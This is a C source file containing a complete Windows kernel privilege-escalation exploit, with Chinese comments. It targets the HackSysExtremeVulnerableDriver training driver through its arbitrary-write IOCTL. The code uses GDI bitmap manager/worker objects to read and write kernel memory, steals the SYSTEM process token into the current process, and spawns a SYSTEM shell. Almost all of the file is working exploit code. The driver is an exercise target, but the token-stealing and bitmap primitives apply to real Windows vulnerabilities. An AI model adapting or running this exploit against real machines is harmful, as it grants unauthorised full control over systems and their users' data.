#include<stdio.h>
#include<Windows.h>
#include<Psapi.h>

typedef struct _WRITE_WHAT_WHERE
{
	PULONG_PTR What;
	PULONG_PTR Where;
} WRITE_WHAT_WHERE, *PWRITE_WHAT_WHERE;
char driverName[1024];


VOID readOOB(HBITMAP hManager, HBITMAP hWorker, DWORD32 whereWrite, LPVOID whatWrite, int len)
{
	SetBitmapBits(hManager, len, &whereWrite); // set 写的是 hWorker 的 pvScan0 的值 , 通过控制 hWorker 的 pvScan0 的值来决定对哪块地址进行读写
	GetBitmapBits(hWorker, len, whatWrite);
}

VOID writeOOB(HBITMAP hManager, HBITMAP hWorker, DWORD32 whereWrite, LPVOID whatWrite, int len)
{
	SetBitmapBits(hManager, len, &whereWrite);
	SetBitmapBits(hWorker, len, &whatWrite);
}

DWORD32 getKernelBase()
{
	LPVOID lpImageBase[1024];
	DWORD lpcbNeeded;
	//Retrieves the load address for each device driver in the system
	EnumDeviceDrivers(lpImageBase, sizeof(lpImageBase), &lpcbNeeded);

	for (int i = 0; i < 1024; i++)
	{
		//Retrieves the base name of the specified device driver
		GetDeviceDriverBaseNameA(lpImageBase[i], (char*)driverName, 48);

		if (!strncmp((char*)driverName, "nt", 2))
		{
			printf("[+]success to get %s\n", driverName);
			return (DWORD32)lpImageBase[i];
		}
	}
	return NULL;
}

DWORD32 getSystemEProcessAddr() {
	DWORD32 ntKernelBase = getKernelBase();
	if (ntKernelBase) {
		printf("Success get ntKernelBase: 0x%p\n", ntKernelBase);
	}
	else {
		printf("Failed get ntKernelBase\n");
		exit(-1);
	}
	DWORD32 ntUserBase = NULL;
	ntUserBase = (DWORD32)LoadLibraryA(driverName);
	if (ntUserBase) {
		printf("Success get ntUserBase: 0x%p\n", ntUserBase);
	}
	else {
		printf("Failed get ntUserBase\n");
		exit(-1);
	}
	DWORD32 PsInitialSystemProcessUserSpaceAddr = (DWORD32)GetProcAddress((HMODULE)ntUserBase, "PsInitialSystemProcess");
	if (!PsInitialSystemProcessUserSpaceAddr) {
		printf("Failed get PsInitialSystemProcessUserSpaceAddr\n");
		exit(-1);
	}
	else {
		printf("Success get PsInitialSystemProcessUserSpaceAddr: 0x%p\n", PsInitialSystemProcessUserSpaceAddr);
	}
	DWORD32 PsInitialSystemProcessKernelSpaceAddr = ntKernelBase + (PsInitialSystemProcessUserSpaceAddr - ntUserBase);
	printf("PsInitialSystemProcessKernelSpaceAddr:0x%p", PsInitialSystemProcessKernelSpaceAddr);
	return PsInitialSystemProcessKernelSpaceAddr;
}


DWORD32 getpvScan0Address(HBITMAP handle) {
	printf("    handle value: 0x%p\n", (DWORD32)handle);

	DWORD32 tebAddr = (DWORD32)NtCurrentTeb();
	printf("    tebAddr: 0x%p\n", tebAddr);

	DWORD32 pebAddr = *(PDWORD32)((PUCHAR)tebAddr + 0x30);
	printf("    pebAddr: 0x%p\n", pebAddr);

	DWORD32 GdiSharedHandleTableAddr = *(PDWORD32)((PUCHAR)pebAddr + 0x94);
	printf("    GdiSharedHandleTableAddr: 0x%p\n", GdiSharedHandleTableAddr);

	// GdiSharedHandleTableAddr 是一个指向GDICELL结构体数组的指针
	// GDICELL 结构体 x86 0x10,x64 0x18
	DWORD32 pKernelAddress = GdiSharedHandleTableAddr + ((DWORD32)handle & 0xffff) * 0x10;
	printf("    pKernelAddress: 0x%p\n", pKernelAddress);

	DWORD32 surfaceObject = *(PDWORD32)pKernelAddress;
	printf("    surfaceObject address: 0x%p\n", surfaceObject);
	// BASEOBJECT 结构体 x86 0x10,x64 0x18
	// pvScan0 在 SURFOBJ 结构体中的偏移 x86 0x20,x64 0x38
	DWORD32 pvScan0Address = surfaceObject + 0x10 + 0x20;
	printf("    pvScan0 address: 0x%p\n", pvScan0Address);
	return pvScan0Address;
}

VOID Trigger(DWORD32 where, DWORD32 what, HANDLE hevd)
{
	WRITE_WHAT_WHERE exploit;
	DWORD lpbReturn = 0;

	exploit.Where = (PULONG_PTR)where;
	exploit.What = (PULONG_PTR)& what;

	DeviceIoControl(hevd,
		0x22200B,
		&exploit,
		sizeof(WRITE_WHAT_WHERE),
		NULL,
		0,
		&lpbReturn,
		NULL);
}

HANDLE OpenDriver() {
	HANDLE hevd = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
		NULL);

	if (hevd == INVALID_HANDLE_VALUE) {
		wprintf(L"[-] Failed to open hevd\n");
		exit(-1);
	}
	else {
		wprintf(L"[+] Success to open hevd\n");
	}
	return hevd;
}

int main() {
	HANDLE hevd = OpenDriver();
	HBITMAP hManager = CreateBitmap(0x20, 0x20, 0x1, 0x8, NULL);
	if (hManager == NULL) {
		printf("create manager bitmap failed\n");
		return 0;
	}
	HBITMAP hWorker = CreateBitmap(0x20, 0x20, 0x1, 0x8, NULL);
	if (hWorker == NULL) {
		printf("create worker bitmap failed\n");
		return 0;
	}

	printf("Manager bitmap:\n");
	DWORD32 ManagerpvScan0Address = getpvScan0Address(hManager);
	printf("Worker bitmap:\n");
	DWORD32 WorkerpvScan0Address = getpvScan0Address(hWorker);
	Trigger(ManagerpvScan0Address, WorkerpvScan0Address, hevd);

	DWORD32 systemEprocessAddr = 0;
	systemEprocessAddr = getSystemEProcessAddr();
	LPVOID lpSystemToken = NULL; // 获取 system 进程的 token
	readOOB(hManager, hWorker, getSystemEProcessAddr(), &systemEprocessAddr, sizeof(DWORD32));
	readOOB(hManager, hWorker, (systemEprocessAddr + 0x0f8), &lpSystemToken, sizeof(DWORD32));

	// _eprocess + 0x0f8 是 token
	// _eprocess + 0x0B8 是 ActiveProcessLinks.Flink
	// _eprocess + 0x0b4 是 processid
	// 获取当前进程的 _eprocess
	DWORD32 lpNextEPROCESS = 0;
	LPVOID lpCurrentPID = NULL;
	DWORD32 dwCurrentPID;
	LIST_ENTRY lpNextEntryAddreess = { 0 };
	DWORD32 currentProcessID = GetCurrentProcessId();   // 通过PID判断是否获取到当前进程的地址
	readOOB(hManager, hWorker, systemEprocessAddr + 0x0B8, &lpNextEntryAddreess, sizeof(LIST_ENTRY));

	do  // 根据PID是否找到当前进程 
	{
		// 获取下一个进程
		lpNextEPROCESS = (DWORD32)((PUCHAR)lpNextEntryAddreess.Flink - 0x0B8);
		// 获取PID
		readOOB(hManager, hWorker, lpNextEPROCESS + 0x0b4, &lpCurrentPID, sizeof(LPVOID));
		dwCurrentPID = LOWORD(lpCurrentPID);
		readOOB(hManager, hWorker, lpNextEPROCESS + 0x0B8, &lpNextEntryAddreess, sizeof(LIST_ENTRY));
	} while (dwCurrentPID != currentProcessID);

	DWORD32 currentTokenAddress = (DWORD32)lpNextEPROCESS + 0x0f8;
	writeOOB(hManager, hWorker, currentTokenAddress, lpSystemToken, sizeof(LPVOID));

	system("cmd.exe");
}